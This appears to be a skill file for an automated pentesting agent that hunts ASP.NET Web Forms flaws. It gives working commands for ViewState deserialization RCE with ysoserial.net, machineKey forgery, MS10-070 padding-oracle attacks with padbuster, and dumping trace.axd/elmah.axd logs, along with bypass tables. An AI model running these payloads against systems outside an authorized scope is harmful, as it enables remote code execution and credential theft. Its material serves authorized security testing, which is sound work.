---
name: aspnet
description: >
  Hunt for ASP.NET (Web Forms / classic .NET) weaknesses: ViewState deserialization RCE when the
  machineKey is known/leaked/weak, __VIEWSTATE MAC/validation bypass, exposure of diagnostic
  endpoints (trace.axd, elmah.axd, _vti_, WebResource/ScriptResource), and the ASP.NET padding
  oracle (MS10-070) against encrypted ViewState/WebResource.axd. Use when the target serves
  .aspx/.asmx/.ashx, emits a __VIEWSTATE field, sets ASP.NET_SessionId, or returns Server:
  Microsoft-IIS with X-AspNet-Version. Keywords: asp.net, viewstate, __VIEWSTATE, machineKey,
  ysoserial.net, deserialization, trace.axd, elmah, padding oracle, MS10-070, WebResource.axd,
  EVENTVALIDATION, X-AspNet-Version, IIS.
  Do NOT use for .NET deserialization outside ViewState (use deserialization) or ASP.NET Core
  minimal-API issues unrelated to Web Forms. For generic info leaks use info-disclosure.
metadata:
  type: hunt
  phase: hunting
  cwe: [CWE-502, CWE-347, CWE-200, CWE-209, CWE-310]
  mitre_attack: [T1190, T1212, T1552.001]
  tools: [curl, ysoserial.net, badsecrets, blacklist3r, burp, padbuster]
depends_on: [active-recon, tech-stack-fingerprint, info-disclosure]
feeds_into: [chain-analysis, rce, info-disclosure]
chains_with: [deserialization, rce, info-disclosure, cryptographic-oracle]
---

## Signals

- URLs ending `.aspx`, `.asmx`, `.ashx`, `.axd`; a hidden `__VIEWSTATE` form field, often with
  `__VIEWSTATEGENERATOR` and `__EVENTVALIDATION`.
- Headers: `Server: Microsoft-IIS/x`, `X-AspNet-Version`, `X-AspNetMvc-Version`, `X-Powered-By:
  ASP.NET`, `Set-Cookie: ASP.NET_SessionId=`.
- Diagnostic handlers reachable: `/trace.axd`, `/elmah.axd`, `/WebResource.axd`,
  `/ScriptResource.axd`, `/Telerik.Web.UI.WebResource.axd`.
- Verbose errors: a yellow-screen-of-death stack trace, `Validation of viewstate MAC failed`,
  `Padding is invalid and cannot be removed`, or `The state information is invalid`.
- A `__VIEWSTATE` that is base64 but NOT prefixed with a MAC — or an app whose `web.config`
  `enableViewStateMac="false"` (inferred from behaviour) — flags the high-value deserialization
  path.

## Prerequisites

- Confirmed Web Forms surface (a `__VIEWSTATE` field present) for the ViewState vectors.
- For ViewState RCE: either a leaked/weak/known `machineKey` (validationKey + decryptionKey +
  algorithms) or an app with ViewState MAC disabled. Without one of these, ViewState RCE is
  Unproven — do not claim it from a stack trace alone.
- For the padding oracle: an endpoint that decrypts attacker-supplied ciphertext and returns a
  distinguishable "padding invalid" vs "other error" response (WebResource.axd/ScriptResource.axd
  classically).
- `ysoserial.net` built, and `badsecrets`/`blacklist3r` for machineKey recovery/validation.

## Methodology

1. **Fingerprint and capture ViewState.** Confirm Web Forms and grab the token + generator:
   ```bash
   curl -s -I https://target/Default.aspx | grep -iE 'x-aspnet|server: *microsoft-iis|asp.net_sessionid'
   curl -s https://target/Default.aspx | grep -oE 'id="__VIEWSTATE(GENERATOR)?" value="[^"]+"'
   ```
   Note whether a MAC appears appended and whether `__VIEWSTATEGENERATOR` is present (needed to
   craft a valid signed ViewState if you recover the key).

2. **Check for a known/weak machineKey.** Default or sample keys from tutorials, Telerik, and
   leaked `web.config`s are widely reused. Validate the captured ViewState against known keys:
   ```bash
   # badsecrets identifies the key if it is a known/default one and tells you the algorithms
   python3 -m badsecrets.examples --url https://target/Default.aspx
   # or validate a captured value directly
   python3 -c "from badsecrets import ViewState; print(ViewState().check_secret('<__VIEWSTATE>'))"
   ```
   A match means you can forge a MAC-valid ViewState — this is the gate to deserialization RCE.

3. **ViewState deserialization RCE (only with a key or MAC disabled).** Generate a gadget payload
   and submit it as `__VIEWSTATE`; confirm execution out-of-band, never blind:
   ```bash
   # MAC disabled: unsigned ViewState is deserialized directly
   ysoserial.exe -p ViewState -g TypeConfuseDelegate \
     -c "nslookup TOKEN.DOMAIN.oast.site" --apppath="/" --path="/Default.aspx" --isdebug
   # MAC enabled but key known: sign with recovered keys
   ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile \
     --generator=<__VIEWSTATEGENERATOR> \
     --validationkey=<HEX> --validationalg=<SHA1|HMACSHA256> \
     --decryptionkey=<HEX> --decryptionalg=<AES|3DES> \
     -c "nslookup TOKEN.DOMAIN.oast.site"
   # submit and poll the OOB listener
   curl -s -X POST https://target/Default.aspx --data-urlencode "__VIEWSTATE=<payload-b64>" \
     --data-urlencode "__VIEWSTATEGENERATOR=<gen>"
   python3 -m engine.oast poll --audit-dir .
   ```
   Use a benign OOB command (DNS/HTTP callback) as proof. Any state-changing or shell command is a
   Human-gate action — stop and confirm first.

4. **__VIEWSTATE MAC / validation bypass.** Where `enableViewStateMac="false"` or an unsigned
   ViewState is accepted, deserialization needs no key; also test tampering non-critical state to
   confirm it is honored unsigned:
   ```bash
   # does the app accept a ViewState with a flipped/removed MAC without a "MAC failed" error?
   curl -s -X POST https://target/Default.aspx --data-urlencode "__VIEWSTATE=<tampered>" \
     --data-urlencode "__VIEWSTATEGENERATOR=<gen>" | grep -iE 'viewstate MAC failed|state information is invalid'
   ```
   No MAC-failure error on a tampered ViewState is strong evidence MAC is off — the RCE gate.

5. **Padding oracle (MS10-070).** If an endpoint decrypts attacker ciphertext and distinguishes
   padding errors, you can decrypt/forge without the key (classically WebResource.axd `d=` param):
   ```bash
   # distinguish responses: "Padding is invalid" (500) vs other (200/404) across tampered ciphertext
   curl -s -o /dev/null -w "%{http_code}\n" "https://target/WebResource.axd?d=<ciphertext>&t=<ticks>"
   # automate with padbuster against the parameter that carries the ciphertext
   padbuster "https://target/WebResource.axd?d=AAAAAAAAAAAAAAAAAAAAAA&t=123" AAAAAAAAAAAAAAAAAAAAAA 16 \
     -encoding 3 -plaintext test
   ```
   A reliable two-state oracle (padding-valid vs. invalid) is the finding; downloading `web.config`
   via the oracle (historical MS10-070 impact) is high severity but a state-read — document the
   exact bytes recovered.

6. **Diagnostic endpoint exposure.** Pull trace/elmah for request dumps, cookies, and errors:
   ```bash
   curl -s https://target/trace.axd | grep -iE 'application trace|localRemote|session'
   curl -s https://target/elmah.axd | grep -iE 'error log|elmah'       # elmah.axd/detail?id= leaks full requests
   curl -s "https://target/elmah.axd/download"                          # CSV dump of logged errors (PII, tokens)
   ```
   `trace.axd` with `localOnly="false"` and remotely reachable `elmah.axd` leak request bodies,
   cookies, and sometimes credentials — info-disclosure that feeds session hijack / machineKey hunt.

7. **Confirm the primitive and stop at the gate.** Record which path you proved (key-known RCE,
   MAC-off RCE, padding oracle, diagnostic leak). Dropping a shell or reading beyond a proof file
   is a Human-gate action.

## Tooling

- `ysoserial.net` — ViewState (and other .NET) gadget generation; `-p ViewState` with
  generator/validationkey flags (verify flags with `-h`; the flag set differs by release).
- `badsecrets` / `blacklist3r` — detect known/weak machineKeys from a captured ViewState and name
  the algorithms.
- `padbuster` — automate the MS10-070 padding oracle; verify encoding flag matches the parameter.
- `curl` / Burp — capture `__VIEWSTATE`/`__VIEWSTATEGENERATOR`, submit forged payloads, read
  trace/elmah.
- `engine.oast` / `interactsh` — OOB proof for ViewState RCE (callback correlated by token).

## Root Causes

- Static or leaked `machineKey` (default sample keys, keys committed to source, Telerik/vendor
  defaults) — a forged ViewState then passes MAC and is deserialized into a gadget.
- `enableViewStateMac="false"` (or legacy framework targeting that disables it) — ViewState is
  deserialized without any integrity check.
- `BinaryFormatter`/`LosFormatter` ViewState deserialization of untrusted input — the gadget
  surface itself (overlaps deserialization).
- A decryption endpoint that leaks padding-validity as a distinguishable response (MS10-070), no
  constant-time error handling, unpatched framework.
- Diagnostic handlers (`trace.axd` not `localOnly`, `elmah.axd` unauthenticated) left reachable in
  production, dumping requests/errors.

## Validation Gate (minimum proof)

- **Demonstrated:** a token-correlated OOB callback from a ViewState gadget payload (RCE); a
  machineKey confirmed by `badsecrets`/`blacklist3r` AND a MAC-valid forged ViewState accepted; a
  reliable padding oracle shown across multiple ciphertexts (and ideally bytes recovered); or a
  `trace.axd`/`elmah.axd` response containing real request data/credentials. Payload + evidence.
- **Inferred:** a tampered ViewState accepted without a "MAC failed" error (MAC likely off) but no
  gadget executed yet; a single padding-error/200 split not yet repeated; a machineKey candidate
  from a leaked config not yet validated against a live ViewState.
- **Unproven:** "ViewState present + yellow-screen stack trace, therefore deserialization RCE" with
  no key and no OOB proof; "runs IIS, so MS10-070". Do not report.
- Name the vector (key-known RCE vs MAC-off RCE vs padding oracle vs diagnostic leak) — remediation
  and severity differ sharply.

## Payloads & Detection Patterns

Guía de caza: una familia por primitiva de .NET/Web Forms. El RCE por ViewState es ciego: el único
camino a `Demonstrated` es un callback OOB correlacionado por token, nunca un stack trace.

| Categoría | Shape | Propósito |
|---|---|---|
| ViewState RCE (MAC off) | `ysoserial -p ViewState -g TypeConfuseDelegate -c "<oob>"` sin firma | Deserializar gadget sin clave |
| ViewState RCE (key known) | `ysoserial -p ViewState --validationkey/--decryptionkey ...` | Forjar ViewState MAC-válido |
| MachineKey check | `badsecrets`/`blacklist3r` sobre `__VIEWSTATE` capturado | Detectar clave default/filtrada |
| MAC bypass probe | `__VIEWSTATE` manipulado sin error "MAC failed" | Confirmar que MAC está desactivado |
| Padding oracle | `WebResource.axd?d=<ct>&t=<ticks>` con split 500/200 | Descifrar/forjar sin clave (MS10-070) |
| trace.axd leak | `GET /trace.axd` | Dump de requests/cookies/sesión |
| elmah.axd leak | `GET /elmah.axd`, `/elmah.axd/download` | Log de errores con PII/tokens |

Surface signals que delatan la clase antes de inyectar:
- URL: `.aspx`/`.asmx`/`.ashx`/`.axd`, `/trace.axd`, `/elmah.axd`, `WebResource.axd?d=`.
- HTML: campos `__VIEWSTATE`, `__VIEWSTATEGENERATOR`, `__EVENTVALIDATION`.
- Headers: `X-AspNet-Version`, `Server: Microsoft-IIS`, `ASP.NET_SessionId`; errores
  "Validation of viewstate MAC failed", "Padding is invalid".

```bash
# captura de ViewState + fingerprint (no destructivo)
curl -s https://target/Default.aspx | grep -oE 'id="__VIEWSTATE(GENERATOR)?" value="[^"]+"'
curl -s -I https://target/Default.aspx | grep -iE 'x-aspnet-version|server: *microsoft-iis'
```

```bash
# machineKey: ¿el ViewState valida contra una clave conocida/default?
vs=$(curl -s https://target/Default.aspx | grep -oP '__VIEWSTATE" value="\K[^"]+')
python3 -c "from badsecrets import ViewState; print(ViewState().check_secret('$vs'))"
```

```bash
# padding oracle: dos estados distinguibles ante ciphertext manipulado
for ct in AAAA... BBBB... CCCC...; do
  curl -s -o /dev/null -w "%{http_code}\n" "https://target/WebResource.axd?d=$ct&t=123"
done   # mezcla estable de 500 (padding invalid) y 200/404 = oráculo presente
```

## Bypass Techniques

Agrupadas por la defensa que evaden; probar la familia completa antes de declarar no-vulnerable.

| Filtro evadido | Técnica | Notas |
|---|---|---|
| MAC presente | Recuperar machineKey (badsecrets/blacklist3r/leaked web.config) y firmar con ysoserial | Sin clave, el ViewState RCE queda Unproven |
| EVENTVALIDATION estricto | Incluir `__EVENTVALIDATION`/`__VIEWSTATEGENERATOR` capturados al postear | El servidor exige el generator correcto |
| trace.axd `localOnly` | Probar `X-Forwarded-For`/`X-Original-URL` si un proxy marca el origen como local | Depende de cómo evalúa el "local" |
| elmah.axd autenticado | `/elmah.axd/download` o `.../detail?id=` a veces sin el mismo guard | Rutas secundarias con authz inconsistente |
| Oracle con error genérico | Medir timing/longitud además del status para separar padding-invalid | El split puede estar en el cuerpo, no en el código |
| Clave rotada por entorno | Probar la misma clave default en staging/beta (reuso entre entornos) | machineKey suele copiarse entre despliegues |

## Chain Anchors

Before declaring this finding complete, probe these escalation paths:

1. **ViewState deserialization → rce** — With a key or MAC off, does a gadget produce a
   token-correlated OOB callback? Gate any command beyond a benign callback.
2. **machineKey reuse across environments** — Does the same key validate ViewState on
   staging/beta/prod? One leaked key can compromise every environment.
3. **Padding oracle → web.config read** — Can MS10-070 be driven to recover `web.config`
   (and thus the machineKey) → escalate to deterministic ViewState RCE?
4. **Diagnostic leak → session hijack / machineKey hunt** — Do trace.axd/elmah dumps expose session
   cookies, auth tokens, or config revealing the machineKey? Chain info-disclosure → auth-bypass.
5. **Forged ViewState → broken-access-control** — Can tampered server-side state elevate role or
   bypass a postback guard even short of RCE?

A finding without chain anchor results is INCOMPLETE. Record each anchor as
tested/not-applicable/blocked with the reason.

## Chains & Compositions

- Leaked/weak machineKey → forged `__VIEWSTATE` → **deserialization** → **rce** (OOB-proven, gated).
- Padding oracle (MS10-070) → `web.config` / machineKey recovery → deterministic ViewState **rce**.
- `trace.axd`/`elmah.axd` exposure → **info-disclosure** → session cookie theft → **auth-bypass**;
  or config leak → machineKey → ViewState RCE.
- MAC disabled → unsigned ViewState tampering → **broken-access-control** (server-state forgery)
  even before full RCE.
- machineKey reuse across staging/prod → single key compromises every environment (cross-env pivot).

## Gotchas

- **No key, no ViewState RCE.** A yellow-screen stack trace or "viewstate MAC failed" error is a
  signal, not a finding. RCE requires a recovered/weak key OR MAC disabled, plus an OOB callback —
  otherwise Inferred at most.
- **OOB proof, benign command.** Prove execution with a DNS/HTTP callback, not a shell or any
  state-changing command — that is a Human-gate action; stop and confirm scope first.
- **ysoserial.net flags drift by release.** The `-p ViewState` flag set (generator, apppath, keys)
  differs between versions — run `-h` and match the exact release; don't copy flags blindly.
- **Padding oracle needs a clean two-state split.** Mixed 500s from unrelated errors create false
  oracles; confirm the split tracks padding validity specifically (and survives repeats) before
  claiming MS10-070.
- **Common N/A:** `.axd` handlers return 404/403 remotely, ViewState carries a valid MAC with an
  unknown key, framework patched for MS10-070 — record tested-and-safe with the evidence.
- **Overclaim trap:** `badsecrets` reporting "no known key" means only that it is not a *known*
  default — it is not proof the key is strong, but you still cannot forge without recovering it.
